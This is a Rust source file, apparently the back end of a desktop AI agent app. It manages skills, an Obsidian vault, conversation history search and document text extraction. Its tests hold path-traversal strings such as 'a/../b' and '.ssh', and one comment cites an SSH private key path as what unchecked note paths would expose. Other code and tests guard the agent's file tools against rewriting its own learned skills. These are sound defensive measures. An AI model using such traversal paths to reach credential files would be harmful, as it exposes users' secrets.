        assert_eq!(std::fs::read_to_string(dest.join("nested/note.md")).unwrap(), "user");
        assert_eq!(std::fs::read_to_string(dest.join("new.md")).unwrap(), "new");
        let _ = std::fs::remove_dir_all(base);
    }

    #[cfg(unix)]
    #[test]
    fn vault_copy_rejects_symlinks_instead_of_marking_a_partial_copy_done() {
        use std::os::unix::fs::symlink;
        let (base, src, dest) = temp_pair("vault-symlink");
        symlink(src.join("missing.md"), src.join("broken.md")).unwrap();

        assert!(copy_tree_no_clobber(&src, &dest).is_err());
        let _ = std::fs::remove_dir_all(base);
    }
}

/// Copy the skills shipped in the bundle into the global skills folder, so a
/// fresh install starts with a curated set. User-modified or user-deleted
/// skills are left alone (copy only when the skill folder does not exist).
fn seed_bundled_skills() {
    let Some(res) = resource_dir() else { return };
    let src = res.join("packaged/skills");
    let Ok(rd) = std::fs::read_dir(&src) else { return };
    let dest_base = app_support().join("skills");
    for e in rd.flatten() {
        let p = e.path();
        if !p.is_dir() {
            continue;
        }
        let name = e.file_name();
        let dest = dest_base.join(&name);
        if dest.exists() {
            continue;
        }
        let _ = std::fs::create_dir_all(&dest);
        if let Ok(files) = std::fs::read_dir(&p) {
            for f in files.flatten() {
                let _ = std::fs::copy(f.path(), dest.join(f.file_name()));
            }
        }
    }
}

fn skill_search_dirs() -> Vec<(PathBuf, String)> {
    let mut v = vec![(app_support().join("skills"), "global".to_string())];
    if let Some(ws) = workspace_dir() {
        v.push((ws.join(".galactus/skills"), "workspace".to_string()));
        v.push((ws.join(".claude/skills"), "workspace".to_string()));
    }
    v
}

fn parse_frontmatter(md: &str) -> (String, String) {
    let mut name = String::new();
    let mut desc = String::new();
    let mut lines = md.lines();
    if lines.next().map(|l| l.trim() == "---").unwrap_or(false) {
        for l in lines {
            if l.trim() == "---" {
                break;
            }
            if let Some(v) = l.strip_prefix("name:") {
                name = v.trim().trim_matches('"').to_string();
            } else if let Some(v) = l.strip_prefix("description:") {
                desc = v.trim().trim_matches('"').to_string();
            }
        }
    }
    (name, desc)
}

/// Resolved absolute path of a note (for the diff preview before an agent
/// rewrite). Same hardening as every obsidian_* command.
#[tauri::command]
fn obsidian_resolve(note: String) -> Result<String, String> {
    let vault = settings_load()
        .get("obsidian_vault")
        .cloned()
        .filter(|s| !s.is_empty())
        .ok_or("no Obsidian vault configured")?;
    Ok(resolve_note(Path::new(&vault), &note)?.display().to_string())
}

/// Full write of a vault note (the constellation editor's save). Same
/// traversal hardening as every obsidian_* command.
#[tauri::command]
fn obsidian_write(note: String, text: String) -> Result<(), String> {
    let vault = settings_load()
        .get("obsidian_vault")
        .cloned()
        .filter(|s| !s.is_empty())
        .ok_or("no Obsidian vault configured")?;
    let p = resolve_note(Path::new(&vault), &note)?;
    if let Some(dir) = p.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    std::fs::write(&p, text.as_bytes()).map_err(|e| e.to_string())
}

/// Turn a picked folder into an Obsidian vault (idempotent on an existing
/// one) and make it the configured vault.
#[tauri::command]
fn obsidian_create_vault(path: String) -> Result<String, String> {
    let root = PathBuf::from(&path);
    std::fs::create_dir_all(&root).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join(".obsidian")).map_err(|e| e.to_string())?;
    let welcome = root.join("Bienvenue.md");
    if !welcome.exists() {
        let _ = std::fs::write(
            &welcome,
            "# Bienvenue\n\nCe coffre a ete cree par Galactus. Les notes liees par des [[wikilinks]] apparaissent dans la Constellation.\n",
        );
    }
    settings_update(|map| {
        map.insert("obsidian_vault".into(), path.clone());
    })?;
    Ok(path)
}

/// Graph of the Obsidian vault for the 3D constellation view: notes as
/// nodes, wikilinks as edges. Bounded walk, resilient to weird files.
#[tauri::command]
async fn obsidian_graph() -> Result<Value, String> {
    let vault = settings_load()
        .get("obsidian_vault")
        .cloned()
        .filter(|s| !s.is_empty())
        .ok_or("no Obsidian vault configured")?;
    let root = PathBuf::from(&vault);

    // Collect notes (bounded).
    let mut files: Vec<PathBuf> = Vec::new();
    let mut stack = vec![(root.clone(), 0u32)];
    while let Some((dir, depth)) = stack.pop() {
        if depth > 8 || files.len() >= 2500 {
            break;
        }
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for e in rd.flatten() {
            let p = e.path();
            let name = e.file_name().to_string_lossy().into_owned();
            if name.starts_with('.') {
                continue;
            }
            if p.is_dir() {
                stack.push((p, depth + 1));
            } else if p.extension().map(|x| x == "md").unwrap_or(false) {
                files.push(p);
                if files.len() >= 2500 {
                    break;
                }
            }
        }
    }

    // Index by stem (lowercased), first occurrence wins like Obsidian.
    let mut index: HashMap<String, usize> = HashMap::new();
    let mut names: Vec<String> = Vec::new();
    let mut rels: Vec<String> = Vec::new();
    for f in &files {
        let stem = f.file_stem().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default();
        let key = stem.to_lowercase();
        if let std::collections::hash_map::Entry::Vacant(slot) = index.entry(key) {
            slot.insert(names.len());
            names.push(stem);
            rels.push(
                f.strip_prefix(&root)
                    .map(|r| r.to_string_lossy().into_owned())
                    .unwrap_or_default(),
            );
        }
    }

    // Extract [[wikilinks]] and keep edges between existing notes.
    let mut degree = vec![0u32; names.len()];
    let mut edges: Vec<(u32, u32)> = Vec::new();
    let mut seen: std::collections::HashSet<(u32, u32)> = std::collections::HashSet::new();
    for f in &files {
        let stem_key = f
            .file_stem()
            .map(|s| s.to_string_lossy().to_lowercase())
            .unwrap_or_default();
        let Some(&src) = index.get(&stem_key) else { continue };
        let Ok(text) = std::fs::read_to_string(f) else { continue };
        let capped = &text[..floor_char_boundary(&text, 200_000)];
        for part in capped.split("[[").skip(1) {
            let Some(end) = part.find("]]") else { continue };
            let raw = &part[..end];
            let target = raw.split(['|', '#']).next().unwrap_or("").trim();
            if target.is_empty() {
                continue;
            }
            // "dossier/Note" links resolve on the last segment.
            let leaf = target.rsplit('/').next().unwrap_or(target).to_lowercase();
            let Some(&dst) = index.get(&leaf) else { continue };
            if dst == src {
                continue;
            }
            let key = (src.min(dst) as u32, src.max(dst) as u32);
            if seen.insert(key) {
                edges.push(key);
                degree[src] += 1;
                degree[dst] += 1;
            }
        }
    }

    let nodes: Vec<Value> = names
        .iter()
        .zip(rels.iter())
        .zip(degree.iter())
        .map(|((n, p), d)| json!({ "n": n, "p": p, "d": d }))
        .collect();
    let edge_list: Vec<Value> = edges.iter().map(|(a, b)| json!([a, b])).collect();
    Ok(json!({ "nodes": nodes, "edges": edge_list }))
}

#[tauri::command]
fn skills_list() -> Vec<SkillInfo> {
    let mut out = Vec::new();
    for (dir, scope) in skill_search_dirs() {
        let rd = match std::fs::read_dir(&dir) {
            Ok(rd) => rd,
            Err(_) => continue,
        };
        for e in rd.flatten() {
            let p = e.path();
            let skill_md = if p.is_dir() {
                p.join("SKILL.md")
            } else if p.file_name().map(|n| n == "SKILL.md").unwrap_or(false) {
                p.clone()
            } else {
                continue;
            };
            if !skill_md.is_file() {
                continue;
            }
            if let Ok(md) = std::fs::read_to_string(&skill_md) {
                let (mut name, desc) = parse_frontmatter(&md);
                if name.is_empty() {
                    name = p
                        .file_stem()
                        .map(|s| s.to_string_lossy().into_owned())
                        .unwrap_or_default();
                }
                out.push(SkillInfo {
                    name,
                    description: desc,
                    path: skill_md.display().to_string(),
                    scope: scope.clone(),
                });
            }
        }
    }
    out
}

#[tauri::command]
fn skill_read(name: String) -> Result<String, String> {
    for s in skills_list() {
        if s.name == name {
            return std::fs::read_to_string(&s.path).map_err(|e| e.to_string());
        }
    }
    Err(format!("skill not found: {name}"))
}

// ------------------------------------------------- learned skills (storage)
//
// The procedural memory bank: skills the AGENT wrote for itself after a task.
// Storage only. Everything that decides whether a skill may be written, what
// it may contain and whether it may be loaded lives in app/src/learned.ts,
// where it is pure and pinned by tests.
//
// Three properties are the reason this is a separate directory and a separate
// set of commands rather than a fourth entry in `skill_search_dirs`:
//
//  1. `skills_list` and `skill_read` MUST NOT be able to return one of these.
//     The thirty shipped skills and the agent's own notes must never share a
//     listing, an ordering or a read path, or the provenance recorded in
//     docs/skills-sources.md stops meaning anything.
//  2. The folder sits under app_support(), which `is_protected_write` already
//     refuses for `tool_fs_write`. So the agent cannot rewrite a stored skill
//     with its own file tools: the authoring pipeline, which validates, is the
//     only way in. Validation that can be bypassed by a second write is not
//     validation.
//  3. Deleting is first class, one by one and all at once, because a memory
//     the user cannot empty is not a memory, it is a residue.
//
// The slug rules are enforced here as well as in TypeScript. That is not
// redundancy: this side is what actually holds if the front end is ever
// bypassed, and it is the only side that runs before a path is built.

#[derive(Serialize, Clone)]
struct LearnedSkillFile {
    slug: String,
    body: String,
}

fn learned_dir() -> PathBuf {
    app_support().join("skills-learned")
}

/// Lowercase ascii, digits and single hyphens, bounded. No dot anywhere, so
/// "..", "." and dot-files cannot be spelled at all.
fn valid_learned_slug(slug: &str) -> bool {
    let bytes = slug.as_bytes();
    if bytes.len() < 2 || bytes.len() > 48 {
        return false;
    }
    if !bytes[0].is_ascii_lowercase() && !bytes[0].is_ascii_digit() {
        return false;
    }
    slug.bytes()
        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
        && !slug.contains("--")
}

/// A body larger than this is not a procedure. The TypeScript cap is 6000
/// characters; this one is deliberately looser and exists only so a bug on the
/// other side cannot fill the disk.
const LEARNED_MAX_BODY: usize = 40_000;
/// Hard ceiling on the bank, mirroring MAX_BANK on the TypeScript side with
/// the same intent: the catalogue is charged to every request.
const LEARNED_MAX_ENTRIES: usize = 64;

#[tauri::command]
fn learned_list() -> Vec<LearnedSkillFile> {
    let mut out = Vec::new();
    let Ok(rd) = std::fs::read_dir(learned_dir()) else {
        return out;
    };
    let mut dirs: Vec<PathBuf> = rd.flatten().map(|e| e.path()).filter(|p| p.is_dir()).collect();
    dirs.sort();
    for p in dirs {
        let slug = p
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_default();
        if !valid_learned_slug(&slug) {
            continue;
        }
        if let Ok(body) = std::fs::read_to_string(p.join("SKILL.md")) {
            out.push(LearnedSkillFile { slug, body });
        }
        if out.len() >= LEARNED_MAX_ENTRIES {
            break;
        }
    }
    out
}

#[tauri::command]
fn learned_write(slug: String, body: String) -> Result<String, String> {
    if !valid_learned_slug(&slug) {
        return Err("invalid learned skill name".into());
    }
    if body.len() > LEARNED_MAX_BODY {
        return Err("learned skill body is too large".into());
    }
    let dir = learned_dir().join(&slug);
    // Overwriting an existing slug is fine (a re-approval rewrites the state
    // line); creating a 65th one is not.
    if !dir.exists() && learned_list().len() >= LEARNED_MAX_ENTRIES {
        return Err("the learned skills bank is full".into());
    }
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let p = dir.join("SKILL.md");
    std::fs::write(&p, body.as_bytes()).map_err(|e| e.to_string())?;
    Ok(p.display().to_string())
}

/// Delete one skill, or the whole bank when `slug` is absent. Deleting the
/// bank removes the directory itself, so nothing is left behind for the user
/// to wonder about.
#[tauri::command]
fn learned_delete(slug: Option<String>) -> Result<(), String> {
    match slug {
        Some(s) => {
            if !valid_learned_slug(&s) {
                return Err("invalid learned skill name".into());
            }
            let dir = learned_dir().join(&s);
            if dir.is_dir() {
                std::fs::remove_dir_all(&dir).map_err(|e| e.to_string())?;
            }
            Ok(())
        }
        None => {
            let dir = learned_dir();
            if dir.is_dir() {
                std::fs::remove_dir_all(&dir).map_err(|e| e.to_string())?;
            }
            Ok(())
        }
    }
}

/// The folder itself, so the user can open it in Finder and see that the
/// agent's notes are somewhere other than the thirty shipped skills.
#[tauri::command]
fn learned_folder() -> String {
    learned_dir().display().to_string()
}

#[cfg(test)]
mod learned_slug_tests {
    use super::valid_learned_slug;

    #[test]
    fn traversal_and_dotfiles_cannot_be_spelled() {
        for bad in ["..", ".", ".ssh", "a/../b", "a/b", "A", "-x", "x--y", "", "x"] {
            assert!(!valid_learned_slug(bad), "{bad} must be refused");
        }
    }

    #[test]
    fn ordinary_slugs_pass() {
        for ok in ["git-bisect-loop", "npm-test-then-fix", "a1"] {
            assert!(valid_learned_slug(ok), "{ok} must be accepted");
        }
    }
}

/// The guard the whole "the agent cannot rewrite its own skills" claim rests on.
///
/// The bank lives at app_support()/skills-learned, and the ONLY thing keeping
/// the agent's own file tools out of it is `is_protected_write`, four lines
/// consulted by tool_fs_write and tool_fs_revert. It had no test: the property
/// was documented in three comments and asserted nowhere, so a refactor that
/// dropped the check would have shipped green.
#[cfg(test)]
mod protected_write_tests {
    use super::{app_support, is_protected_write, learned_dir};

    #[test]
    fn the_learned_bank_is_not_writable_by_the_agents_file_tools() {
        let bank = learned_dir();
        assert!(
            is_protected_write(&bank),
            "the bank itself must be refused: {}",
            bank.display()
        );
        // A skill FILE, not just the folder. The agent writes paths, not
        // directories, and a prefix check that only matched the directory
        // exactly would let every file inside it through.
        assert!(
            is_protected_write(&bank.join("git-bisect-loop").join("SKILL.md")),
            "a file inside the bank must be refused too"
        );
    }

    #[test]
    fn the_whole_configuration_folder_is_refused_not_only_the_bank() {
        let support = app_support();
        for name in ["settings.json", "conversations", "schedule/jobs.json", "skills"] {
            let p = support.join(name);
            assert!(is_protected_write(&p), "{} must be refused", p.display());
        }
    }

    #[test]
    fn an_ordinary_user_path_is_still_writable() {
        // The other half: a guard that refused everything would pass the two
        // tests above and break every legitimate write the agent makes.
        for p in ["/tmp/galactus-test-file", "/Users/somebody/projects/x/main.rs"] {
            assert!(
                !is_protected_write(std::path::Path::new(p)),
                "{p} must stay writable"
            );
        }
    }
}

#[tauri::command]
fn memory_read() -> String {
    std::fs::read_to_string(memory_path()).unwrap_or_default()
}

#[tauri::command]
fn memory_write(text: String) -> Result<(), String> {
    let p = memory_path();
    if let Some(dir) = p.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    std::fs::write(&p, text.as_bytes()).map_err(|e| e.to_string())
}

#[tauri::command]
fn memory_append(text: String) -> Result<String, String> {
    let mut cur = memory_read();
    if !cur.is_empty() && !cur.ends_with('\n') {
        cur.push('\n');
    }
    cur.push_str("- ");
    cur.push_str(text.trim());
    cur.push('\n');
    memory_write(cur)?;
    Ok("remembered".into())
}

fn vault_dir() -> Result<PathBuf, String> {
    let map = settings_load();
    let v = map
        .get("obsidian_vault")
        .cloned()
        .filter(|s| !s.is_empty())
        .ok_or("no Obsidian vault set")?;
    Ok(PathBuf::from(v))
}

/// Resolve a note path STRICTLY inside the vault. Absolute paths and any
/// `..` component are rejected: accepting them would turn the obsidian tools
/// into arbitrary disk read/write (e.g. `/Users/x/.ssh/id_rsa`).
fn resolve_note(vault: &Path, note: &str) -> Result<PathBuf, String> {
    use std::path::Component;
    let rel = Path::new(note);
    if rel.is_absolute()
        || note.starts_with('~')
        || rel
            .components()
            .any(|c| !matches!(c, Component::Normal(_) | Component::CurDir))
    {
        return Err("note path must be relative to the vault (no '..', no absolute path)".into());
    }
    let mut p = vault.join(rel);
    if p.extension().is_none() {
        p.set_extension("md");
    }
    Ok(p)
}

#[tauri::command]
async fn obsidian_search(query: String) -> Result<String, String> {
    let vault = vault_dir()?;
    let args: Vec<String> = [
        "-rIn", "-i", "--include=*.md", "-m", "2", "--", &query,
    ]
    .iter()
    .map(|s| s.to_string())
    .chain(std::iter::once(vault.display().to_string()))
    .collect();
    let mut out = run_with_timeout("grep", &args, 8);
    if out.len() > 4000 {
        out.truncate(floor_char_boundary(&out, 4000));
        out.push_str("\n…(truncated)");
    }
    if out.trim().is_empty() {
        return Ok("(no matching notes)".into());
    }
    // Strip the vault prefix for readability.
    Ok(out.replace(&format!("{}/", vault.display()), ""))
}

#[tauri::command]
fn obsidian_read(note: String) -> Result<String, String> {
    let vault = vault_dir()?;
    let p = resolve_note(&vault, &note)?;
    let data = std::fs::read_to_string(&p).map_err(|e| e.to_string())?;
    Ok(if data.len() > TOOL_MAX_OUTPUT {
        format!(
            "{}\n…(truncated)",
            &data[..floor_char_boundary(&data, TOOL_MAX_OUTPUT)]
        )
    } else {
        data
    })
}

#[tauri::command]
fn obsidian_append(note: String, text: String) -> Result<String, String> {
    let vault = vault_dir()?;
    let p = resolve_note(&vault, &note)?;
    if let Some(dir) = p.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    let mut cur = std::fs::read_to_string(&p).unwrap_or_default();
    if !cur.is_empty() && !cur.ends_with('\n') {
        cur.push('\n');
    }
    cur.push_str(&text);
    cur.push('\n');
    std::fs::write(&p, cur.as_bytes()).map_err(|e| e.to_string())?;
    Ok(format!("appended to {}", p.display()))
}

// ---------------------------------------------------------------- conversations

fn conv_dir() -> PathBuf {
    app_support().join("conversations")
}

/// Conversations are plain JSON files, one per thread, plus a lightweight
/// index rebuilt from them on demand. Shared context across threads comes from
/// the memory file, which every conversation reads.
#[tauri::command]
fn conv_list() -> Vec<Value> {
    let dir = conv_dir();
    let mut out: Vec<Value> = Vec::new();
    if let Ok(rd) = std::fs::read_dir(&dir) {
        for e in rd.flatten() {
            let p = e.path();
            if p.extension().map(|x| x != "json").unwrap_or(true) {
                continue;
            }
            if let Ok(txt) = std::fs::read_to_string(&p) {
                if let Ok(v) = serde_json::from_str::<Value>(&txt) {
                    out.push(json!({
                        "id": v["id"].clone(),
                        "title": v["title"].clone(),
                        "created": v["created"].clone(),
                        "updated": v["updated"].clone(),
                        "count": v["items"].as_array().map(|a| a.len()).unwrap_or(0),
                    }));
                }
            }
        }
    }
    out.sort_by(|a, b| {
        b["updated"]
            .as_u64()
            .unwrap_or(0)
            .cmp(&a["updated"].as_u64().unwrap_or(0))
    });
    out
}

#[tauri::command]
fn conv_load(id: String) -> Result<Value, String> {
    let p = conv_dir().join(format!("{}.json", sanitize_id(&id)));
    let txt = std::fs::read_to_string(&p).map_err(|e| e.to_string())?;
    serde_json::from_str(&txt).map_err(|e| e.to_string())
}

/// Atomic per-thread write: temp file in the same directory, then rename.
///
/// Several conversations now stream at the same time, each saving on its own
/// debounce. They target distinct files, so they cannot overwrite each other,
/// but a plain write that is interrupted mid-way (quit, crash, full disk)
/// leaves a truncated JSON that reopens as a lost thread. The rename is
/// atomic on APFS, so a reader sees either the old file or the new one.
#[tauri::command]
fn conv_save(id: String, data: String) -> Result<(), String> {
    let dir = conv_dir();
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let safe = sanitize_id(&id);
    let p = dir.join(format!("{safe}.json"));
    let tmp = dir.join(format!(".{safe}.{}.tmp", std::process::id()));
    std::fs::write(&tmp, data.as_bytes()).map_err(|e| e.to_string())?;
    if let Err(e) = std::fs::rename(&tmp, &p) {
        let _ = std::fs::remove_file(&tmp);
        return Err(e.to_string());
    }
    Ok(())
}

#[tauri::command]
fn conv_delete(id: String) -> Result<(), String> {
    let p = conv_dir().join(format!("{}.json", sanitize_id(&id)));
    if p.exists() {
        std::fs::remove_file(&p).map_err(|e| e.to_string())?;
    }
    Ok(())
}

fn sanitize_id(id: &str) -> String {
    id.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .take(64)
        .collect()
}

// ------------------------------------------------- conversation history search
//
// The model can reach the threads it is NOT in (search_conversations,
// read_conversation). Both go through the permission gate on the TypeScript
// side; here we only render and rank.
//
// No persisted index: the whole corpus is a handful of small JSON files that
// change on every streamed token, so it is read and ranked in milliseconds and
// is always fresh. Ranking itself is the knowledge module's BM25, chunker and
// snippet centring: the same relevance behaviour the user already gets on
// their folders, reused rather than reinvented (knowledge::rank_documents).

/// UTC "YYYY-MM-DD HH:MM" from epoch milliseconds; "?" when there is no date.
///
/// Every excerpt and every transcript carries one: the whole point of reaching
/// old threads is that the model must not mistake them for the current one.
fn stamp(ms: u64) -> String {
    if ms == 0 {
        return "?".into();
    }
    let secs = (ms / 1000) as i64;
    let days = secs.div_euclid(86_400);
    let tod = secs.rem_euclid(86_400);
    // Howard Hinnant's civil_from_days.
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!(
        "{y:04}-{m:02}-{d:02} {:02}:{:02}",
        tod / 3600,
        (tod % 3600) / 60
    )
}

fn clip(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let cut: String = s.chars().take(max).collect();
    format!("{cut}…")
}

/// Plain-text rendering of a stored thread: one line per item, roles named.
/// Tool cards keep their name, argument and a clipped result, enough to be
/// searchable without dragging whole 200 KB dumps into the ranking.
fn conv_transcript(v: &Value) -> String {
    let mut out = String::new();
    for it in v["items"].as_array().cloned().unwrap_or_default() {
        let kind = it["kind"].as_str().unwrap_or("");
        let line = match kind {
            "user" => match it["from"].as_str() {
                Some(from) if !from.is_empty() => format!(
                    "[user · relayed by the agent of \"{from}\"] {}",
                    clip(it["text"].as_str().unwrap_or(""), 4000)
                ),
                _ => format!("[user] {}", clip(it["text"].as_str().unwrap_or(""), 4000)),
            },
            "assistant" => format!("[assistant] {}", clip(it["text"].as_str().unwrap_or(""), 8000)),
            "tool" => format!(
                "[tool {} {}] {}",
                it["name"].as_str().unwrap_or("?"),
                clip(it["arg"].as_str().unwrap_or(""), 200),
                clip(it["result"].as_str().unwrap_or(""), 800)
            ),
            "notice" => format!("[note] {}", clip(it["text"].as_str().unwrap_or(""), 500)),
            "error" => format!("[error] {}", clip(it["text"].as_str().unwrap_or(""), 500)),
            _ => continue,
        };
        out.push_str(&line);
        out.push('\n');
    }
    out
}

/// Every stored thread as (id, title, created, updated, transcript).
/// Oversized files are skipped rather than read: a runaway thread must not
/// stall a search.
fn conv_corpus() -> Vec<(String, String, u64, u64, String)> {
    const MAX_FILE_BYTES: u64 = 8 * 1024 * 1024;
    let mut out = Vec::new();
    let Ok(rd) = std::fs::read_dir(conv_dir()) else {
        return out;
    };
    for e in rd.flatten() {
        let p = e.path();
        if p.extension().map(|x| x != "json").unwrap_or(true) {
            continue;
        }
        if e.metadata().map(|m| m.len() > MAX_FILE_BYTES).unwrap_or(false) {
            continue;
        }
        let Ok(txt) = std::fs::read_to_string(&p) else { continue };
        let Ok(v) = serde_json::from_str::<Value>(&txt) else { continue };
        let id = v["id"].as_str().unwrap_or_default().to_string();
        if id.is_empty() {
            continue;
        }
        out.push((
            id,
            v["title"].as_str().unwrap_or_default().to_string(),
            v["created"].as_u64().unwrap_or(0),
            v["updated"].as_u64().unwrap_or(0),
            conv_transcript(&v),
        ));
    }
    out
}

#[derive(Serialize)]
struct ConvHit {
    id: String,
    title: String,
    created: u64,
    updated: u64,
    /// First line of the matching excerpt inside the rendered transcript.
    line: usize,
    snippet: String,
    score: f64,
}

#[tauri::command]
fn conv_search(query: String, k: Option<usize>) -> Vec<ConvHit> {
    let k = k.unwrap_or(6).clamp(1, 20);
    let corpus = conv_corpus();
    let docs: Vec<(String, String)> = corpus
        .iter()
        .map(|(id, _, _, _, text)| (id.clone(), text.clone()))
        .collect();
    knowledge::rank_documents(&docs, &query, k)
        .into_iter()
        .filter_map(|h| {
            let (id, title, created, updated, _) = corpus.iter().find(|c| c.0 == h.path)?;
            Some(ConvHit {
                id: id.clone(),
                title: title.clone(),
                created: *created,
                updated: *updated,
                line: h.line,
                snippet: h.snippet,
                score: h.score,
            })
        })
        .collect()
}

/// One stored thread as a dated transcript, header first.
#[tauri::command]
fn conv_read(id: String, max_chars: Option<usize>) -> Result<String, String> {
    let cap = max_chars.unwrap_or(24_000).clamp(1_000, 200_000);
    let p = conv_dir().join(format!("{}.json", sanitize_id(&id)));
    let txt = std::fs::read_to_string(&p).map_err(|_| format!("no stored conversation with id {id}"))?;
    let v: Value = serde_json::from_str(&txt).map_err(|e| e.to_string())?;
    let title = v["title"].as_str().unwrap_or("");
    let created = v["created"].as_u64().unwrap_or(0);
    let updated = v["updated"].as_u64().unwrap_or(0);
    let count = v["items"].as_array().map(|a| a.len()).unwrap_or(0);
    let body = conv_transcript(&v);
    let mut head = format!(
        "[stored conversation \"{}\" · id {} · started {} UTC · last updated {} UTC · {} entries]\n\
         [This is a PAST thread, not the conversation you are in. Attribute anything you reuse from it to this title and date.]\n\n",
        if title.is_empty() { "(untitled)" } else { title },
        id,
        stamp(created),
        stamp(updated),
        count
    );
    if body.chars().count() > cap {
        let cut: String = body.chars().take(cap).collect();
        head.push_str(&cut);
        head.push_str(&format!(
            "\n…(transcript truncated at {cap} chars; raise max_chars to read further)"
        ));
    } else {
        head.push_str(&body);
    }
    Ok(head)
}

// ---------------------------------------------------------------- documents

/// The Swift helper is compiled once, on first use, into Application Support.
/// It only needs the Command Line Tools, which any machine building llama.cpp
/// already has. Everything it does (PDFKit text, Vision OCR) is offline.
fn doc_helper() -> Result<PathBuf, String> {
    // Precompiled helper shipped in the bundle: works on Macs without the
    // Command Line Tools (no swiftc needed at runtime).
    if let Some(res) = resource_dir() {
        let prebuilt = res.join("packaged/galactus-doc");
        if prebuilt.is_file() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if let Ok(meta) = std::fs::metadata(&prebuilt) {
                    let mut perm = meta.permissions();
                    if perm.mode() & 0o111 == 0 {
                        perm.set_mode(0o755);
                        let _ = std::fs::set_permissions(&prebuilt, perm);
                    }
                }
            }
            return Ok(prebuilt);
        }
    }
    let bin = app_support().join("galactus-doc");
    let src_candidates = [
        std::env::current_dir()
            .unwrap_or_default()
            .join("src-tauri/helpers/galactus-doc.swift"),
        // Packaged app: the helper ships as a bundle resource
        // (Contents/MacOS/<exe> → Contents/Resources/helpers/…).
        std::env::current_exe()
            .ok()
            .and_then(|p| {
                p.parent()
                    .and_then(|d| d.parent())
                    .map(|d| d.join("Resources/helpers/galactus-doc.swift"))
            })
            .unwrap_or_default(),
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.join("helpers/galactus-doc.swift")))
            .unwrap_or_default(),
        galactus_root()
            .map(|r| r.join("app/src-tauri/helpers/galactus-doc.swift"))
            .unwrap_or_default(),
    ];
    let src = src_candidates
        .iter()
        .find(|p| p.is_file())
        .cloned()
        .ok_or("document helper source not found (app/src-tauri/helpers/galactus-doc.swift)")?;

    // Rebuild when the source is newer than the cached binary.
    let stale = match (std::fs::metadata(&bin), std::fs::metadata(&src)) {
        (Ok(b), Ok(s)) => match (b.modified(), s.modified()) {
            (Ok(bt), Ok(st)) => bt < st,
            _ => false,
        },
        _ => true,
    };
    if !bin.is_file() || stale {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        let out = Command::new("swiftc")
            .args(["-O", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .map_err(|e| format!("swiftc unavailable ({e}). Install Xcode Command Line Tools: xcode-select --install"))?;
        if !out.status.success() {
            return Err(format!(
                "document helper failed to build: {}",
                String::from_utf8_lossy(&out.stderr)
                    .lines()
                    .take(6)
                    .collect::<Vec<_>>()
                    .join(" | ")
            ));
        }
    }
    Ok(bin)
}

fn run_helper(bin: &Path, cmd: &str, path: &str, secs: u64) -> Result<String, String> {
    let child = Command::new(bin)
        .arg(cmd)
        .arg(path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    let out = run_with_deadline(child, Instant::now() + Duration::from_secs(secs))?;
    let Some(status) = out.status else {
        return Err("document reading timed out".into());
    };
    if !status.success() {
        return Err(out.stderr.trim().to_string());
    }
    Ok(out.stdout)
}

/// Pull text out of Office files without any dependency: docx/pptx/xlsx are
/// zipped XML, and macOS ships textutil for rtf/doc/html.
fn office_text(path: &str, ext: &str) -> Result<String, String> {
    match ext {
        "rtf" | "doc" | "html" | "htm" | "webarchive" | "odt" => {
            let out = Command::new("textutil")
                .args(["-convert", "txt", "-stdout", path])
                .output()
                .map_err(|e| e.to_string())?;
            if out.status.success() {
                return Ok(String::from_utf8_lossy(&out.stdout).into_owned());
            }
            Err("textutil could not read this file".into())
        }
        "docx" | "pptx" | "xlsx" => {
            // textutil handles docx directly; the others go through Python's
            // stdlib zip/XML reader (no third-party packages).
            if ext == "docx" {
                let out = Command::new("textutil")
                    .args(["-convert", "txt", "-stdout", path])
                    .output()
                    .map_err(|e| e.to_string())?;
                if out.status.success() {
                    let text = String::from_utf8_lossy(&out.stdout).into_owned();
                    if !text.trim().is_empty() {
                        return Ok(text);
                    }
                }
            }
            // NOTE: this is a Rust *raw* string, so `\n`/`\t` reach Python as
            // escape sequences inside its own string literals, never put a
            // literal newline inside the Python quotes (SyntaxError).
            let script = r#"
import sys, zipfile, re
p = sys.argv[1]
parts = []
with zipfile.ZipFile(p) as z:
    names = [n for n in z.namelist() if n.endswith('.xml')]
    order = [n for n in names if 'document' in n or 'slide' in n or 'sharedStrings' in n or 'sheet' in n]
    for n in (order or names):
        try:
            raw = z.read(n).decode('utf-8', 'ignore')
        except Exception:
            continue
        raw = re.sub(r'</w:p>|</a:p>|</row>', '\n', raw)
        raw = re.sub(r'<[^>]+>', ' ', raw)
        raw = re.sub(r'[ \t]+', ' ', raw)
        raw = re.sub(r'\n\s*\n+', '\n', raw)
        t = raw.strip()
        if t:
            parts.append(t)
print('\n\n'.join(parts))
"#;
            let out = python3_cmd()
                .arg("-c")
                .arg(script)
                .arg(path)
                .output()
                .map_err(|e| e.to_string())?;
            if out.status.success() {
                Ok(String::from_utf8_lossy(&out.stdout).into_owned())
            } else {
                Err(String::from_utf8_lossy(&out.stderr).trim().to_string())
            }
        }
        _ => Err("unsupported office format".into()),
    }
}

